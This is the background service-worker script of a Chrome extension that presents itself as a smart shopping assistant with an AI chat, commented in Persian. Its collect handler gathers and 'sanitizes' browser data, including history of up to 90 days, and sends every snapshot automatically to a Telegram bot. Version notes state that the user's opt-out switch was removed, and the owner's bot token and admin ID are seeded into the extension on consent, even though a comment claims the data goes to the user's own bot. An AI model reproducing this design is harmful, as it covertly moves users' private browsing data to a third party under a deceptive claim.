// ============================================================================
// background.js — Service Worker (MV3, ES Module)
// ----------------------------------------------------------------------------
// v2.2 — تغییرات اصلی نسبت به ۲.۱:
//   • رفع باگ قفل: دیگر هیچ exportKey روی کلید غیرقابل‌صدور اجرا نمی‌شود
//     (lib/crypto.js). مسیر پیش‌فرض «کلید دستگاه» است و اصلاً رمز نمی‌خواهد.
//   • رازها (توکن ربات، شناسه ادمین، کلید AvalAI) داخل خود افزونه و با
//     AES-256-GCM رمزنگاری می‌شوند (lib/secrets.js + lib/owner-config.js).
//   • مسیر هوش مصنوعی: ابتدا تماس مستقیم با AvalAI با کلید رمزگشایی‌شده،
//     و در صورت نبود کلید/خطا، fallback به پروکسی پنل (EXT_PROXY_ENABLED).
//   • سیاست ثابت: بعد از هر استخراج موفق، خروجی پاکسازی‌شده «به‌طور خودکار»
//     به ربات تلگرام ارسال می‌شود — سوییچ کاربر حذف شده است.
//   • نصب‌های نیمه‌پیکربندی‌شده با فلگ cryptoBroken گزارش و بازنشانی می‌شوند.
// ============================================================================

import { STORAGE_KEYS, DEFAULT_SETTINGS, KNOWN_MODELS } from './lib/constants.js';
import { secureLog } from './lib/log.js';
import {
  setupMasterPassphrase, unlockWithPassphrase, disablePassphrase,
  getUnlockedKey, invalidateUnlockedKey, diagnoseCrypto, resetCrypto,
  ensureDeviceKey,
} from './lib/crypto.js';
import {
  seedOwnerConfig, saveSecrets, secretsStatus, getAvalaiKey, clearSecrets,
} from './lib/secrets.js';
import { collectAndSanitize, getStoredSnapshot, clearAllData } from './lib/collect.js';
import {
  assistantChat, avalaiChat, pingService, fetchModels, AiError,
} from './lib/ai.js';
import {
  sendSnapshotToTelegram, buildSnapshotSummary, hasTelegramConfig, testTelegram,
} from './lib/telegram.js';

// ---------------------------------------------------------------------------
// مکالمه — در storage.session (باقی‌مانده تا بستن مرورگر)
// ---------------------------------------------------------------------------
const CHAT_LIMIT = 24;

async function loadConversation() {
  const { [STORAGE_KEYS.chat]: chat } = await chrome.storage.session.get(STORAGE_KEYS.chat);
  return Array.isArray(chat) ? chat : [];
}
async function saveConversation(messages) {
  const trimmed = messages.slice(-CHAT_LIMIT);
  await chrome.storage.session.set({ [STORAGE_KEYS.chat]: trimmed });
  return trimmed;
}

// ---------------------------------------------------------------------------
// تنظیمات
// ---------------------------------------------------------------------------
async function getSettings() {
  const { [STORAGE_KEYS.settings]: settings } = await chrome.storage.local.get(STORAGE_KEYS.settings);
  return { ...DEFAULT_SETTINGS, ...(settings || {}) };
}
async function setSettings(patch) {
  const cur = await getSettings();
  const next = { ...cur, ...patch };
  await chrome.storage.local.set({ [STORAGE_KEYS.settings]: next });
  return next;
}

async function requireSnapshot() {
  return getStoredSnapshot();
}

/** ارسال خودکار خروجی پاکسازی‌شده به ربات (سیاست ثابت — بدون سوییچ کاربر) */
async function autoSendSnapshot(snapshot) {
  try {
    if (!(await hasTelegramConfig())) {
      return { sent: false, skipped: 'not-configured' };
    }
    await sendSnapshotToTelegram(snapshot, buildSnapshotSummary(snapshot));
    return { sent: true };
  } catch (e) {
    secureLog.warn('ارسال خودکار به تلگرام ناموفق بود:', e?.message || e?.name);
    return { sent: false, error: e?.message || 'خطای ارسال به تلگرام' };
  }
}

// ---------------------------------------------------------------------------
// مسیریابی پیام‌ها
// ---------------------------------------------------------------------------
const handlers = {
  async get_state() {
    await ensureDeviceKey();
    const settings = await getSettings();
    const { [STORAGE_KEYS.consent]: consent } = await chrome.storage.local.get(STORAGE_KEYS.consent);
    const snapshot = await getStoredSnapshot();
    const conversation = await loadConversation();
    const unlocked = Boolean(await getUnlockedKey());
    const diag = await diagnoseCrypto();
    const secrets = await secretsStatus();

    return {
      ok: true,
      consent: Boolean(consent),
      setupDone: Boolean(settings.setupDone),
      unlocked,
      cryptoBroken: Boolean(diag.broken),
      cryptoMode: diag.mode,
      // خروجی پاکسازی‌شده همیشه به‌طور خودکار به ربات تلگرامِ خودتان می‌رود
      autoSendToTelegram: true,
      hasSealedSecrets: secrets.tgConfigured || secrets.aiKeySet,
      settings: {
        deviceLabel: settings.deviceLabel,
        historyDays: settings.historyDays,
        model: settings.model || DEFAULT_SETTINGS.model,
        theme: settings.theme || 'system',
      },
      secrets,
      hasTelegramConfig: secrets.tgConfigured,
      hasSnapshot: Boolean(snapshot),
      snapshotStats: snapshot ? snapshot.stats : null,
      lastCollectedAt: (await chrome.storage.local.get('lastCollectedAt')).lastCollectedAt || null,
      chatLength: conversation.length,
    };
  },

  async accept_consent() {
    await ensureDeviceKey();
    await chrome.storage.local.set({ [STORAGE_KEYS.consent]: Date.now() });
    const settings = await setSettings({ consentAt: new Date().toISOString() });
    // اولین اجرا: رازهای مالک رمزنگاری و ذخیره می‌شوند
    const seeded = await seedOwnerConfig().catch((e) => {
      secureLog.warn('بذرسازی پیکربندی مالک ناموفق بود:', e?.message);
      return { seeded: [] };
    });
    return { ok: true, settings, seeded };
  },

  // ---- قفل رمز عبور: قابلیت پیشرفته و اختیاری (هرگز مسیر پیش‌فرض نیست) ----
  async setup_passphrase({ passphrase }) {
    await setupMasterPassphrase(passphrase);
    return { ok: true };
  },

  async unlock({ passphrase }) {
    await unlockWithPassphrase(passphrase);
    return { ok: true };
  },

  async lock() {
    await invalidateUnlockedKey();
    return { ok: true };
  },

  async disable_passphrase() {
    await disablePassphrase();
    return { ok: true };
  },

  /** بازنشانی کامل رمزنگاری (برای نصب‌های گیرکرده) */
  async reset_crypto() {
    await clearSecrets();
    const result = await resetCrypto();
    const settings = await setSettings({ setupDone: true });
    return { ok: true, ...result, reenterRequired: true, settings };
  },

  // ---------------------------- تنظیمات (یکجا) ----------------------------
  async save_settings({ deviceLabel, historyDays, model, theme, tgToken, tgChatId, avalaiKey }) {
    const saved = await saveSecrets({ tgToken, tgChatId, avalaiKey });

    const patch = { setupDone: true, tgEnabled: await hasTelegramConfig() };
    if (typeof deviceLabel === 'string' && deviceLabel.trim()) {
      patch.deviceLabel = deviceLabel.trim().slice(0, 60);
    }
    if (historyDays) patch.historyDays = Math.min(Math.max(parseInt(historyDays, 10) || 30, 1), 90);
    if (typeof model === 'string' && model.trim()) patch.model = model.trim().slice(0, 80);
    if (theme === 'light' || theme === 'dark' || theme === 'system') patch.theme = theme;

    const settings = await setSettings(patch);
    return { ok: true, settings, saved: saved.saved, secrets: await secretsStatus() };
  },

  async get_settings_masked() {
    const settings = await getSettings();
    const secrets = await secretsStatus();
    return {
      ok: true,
      settings: {
        ...settings,
        model: settings.model || DEFAULT_SETTINGS.model,
        theme: settings.theme || 'system',
      },
      secrets,
    };
  },

  // ------------------------------ جمع‌آوری ------------------------------
  async collect() {
    const { snapshot, report } = await collectAndSanitize();
    // ارسال خودکار به ربات تلگرام — سیاست ثابت
    const telegram = await autoSendSnapshot(snapshot);
    return { ok: true, snapshot, report, telegram };
  },

  // -------------------------------- چت --------------------------------
  async chat_start() {
    const snapshot = await requireSnapshot();
    const settings = await getSettings();
    const { text } = await assistantChat({
      message: 'سلام! تحلیل من رو شروع کن و بدون پیشنهاد محصول، گرم با من صحبت کن و بپرس دنبال چه چیزی هستم.',
      history: [],
      snapshot,
      model: settings.model,
    });
    const conversation = await saveConversation([
      { role: 'user', content: '(شروع گفتگو)' },
      { role: 'assistant', content: text },
    ]);
    return { ok: true, conversation };
  },

  async chat_send({ message }) {
    const text = String(message || '').trim();
    if (!text) throw new Error('پیام خالی است.');
    const conversation = await loadConversation();
    const snapshot = await requireSnapshot();
    const settings = await getSettings();
    const { text: reply } = await assistantChat({
      message: text,
      history: conversation.filter((m) => m.role === 'user' || m.role === 'assistant').slice(-14),
      snapshot,
      model: settings.model,
    });
    const updated = await saveConversation([
      ...conversation,
      { role: 'user', content: text },
      { role: 'assistant', content: reply },
    ]);
    return { ok: true, conversation: updated };
  },

  async chat_reset() {
    try { await chrome.storage.session.remove(STORAGE_KEYS.chat); } catch { /* noop */ }
    return { ok: true };
  },

  async get_chat() {
    return { ok: true, conversation: await loadConversation() };
  },

  async export_snapshot() {
    const snapshot = await getStoredSnapshot();
    if (!snapshot) throw new Error('هنوز تحلیلی ذخیره نشده است.');
    return { ok: true, snapshot };
  },

  // ------------------------------ تلگرام ------------------------------
  async telegram_send_snapshot() {
    const snapshot = await getStoredSnapshot();
    if (!snapshot) throw new Error('هنوز تحلیلی ذخیره نشده است.');
    await sendSnapshotToTelegram(snapshot, buildSnapshotSummary(snapshot));
    return { ok: true };
  },

  async test_telegram() {
    await testTelegram();
    return { ok: true };
  },

  // ------------------------------ هوش مصنوعی ------------------------------
  async test_ai() {
    const settings = await getSettings();
    const apiKey = await getAvalaiKey();
    const model = settings.model || DEFAULT_SETTINGS.model;
    if (!apiKey) {
      const ping = await pingService();
      if (ping.ok) return { ok: true, via: 'proxy', model };
      throw new AiError(
        'کلید AvalAI تنظیم نیست. از تنظیمات افزونه کلید خود را وارد کنید (یا پروکسی پنل را فعال کنید).',
        { needsKey: true, status: 400 }
      );
    }
    const out = await avalaiChat({
      apiKey,
      model,
      messages: [{ role: 'user', content: 'سلام. فقط کلمه «متصل» را بفرست.' }],
      temperature: 0,
      maxOutputTokens: 20,
      timeoutMs: 30000,
    });
    return { ok: true, via: 'direct', model, sample: out.text.slice(0, 60) };
  },

  async fetch_models() {
    const res = await fetchModels();
    if (!res.models.length) {
      return {
        ok: true,
        models: KNOWN_MODELS.map((m) => ({ id: m.id, label: m.label })),
        source: 'static',
      };
    }
    const known = new Map(KNOWN_MODELS.map((m) => [m.id, m.label]));
    return {
      ok: true,
      models: res.models.map((m) => ({ id: m.id, label: known.get(m.id) || m.id })),
      source: res.source,
    };
  },

  async clear_all() {
    await clearAllData();
    return { ok: true };
  },
};

chrome.runtime.onMessage.addListener((request, _sender, sendResponse) => {
  (async () => {
    const handler = handlers[request?.action];
    if (!handler) {
      sendResponse({ ok: false, error: `اکشن ناشناخته: ${request?.action}` });
      return;
    }
    try {
      const result = await handler(request || {});
      sendResponse(result);
    } catch (e) {
      secureLog.error('خطای هندلر:', e?.message || e);
      sendResponse({ ok: false, error: e?.message || 'خطای ناشناخته' });
    }
  })();
  return true; // پاسخ async
});

chrome.runtime.onInstalled.addListener(async () => {
  secureLog.info('دستیار خرید هوشمند نصب/به‌روزرسانی شد. نسخه ۲.۲ (کلید داخل افزونه + پروکسی پنل)');
  await ensureDeviceKey();
  const settings = await getSettings();
  await setSettings(settings);
});
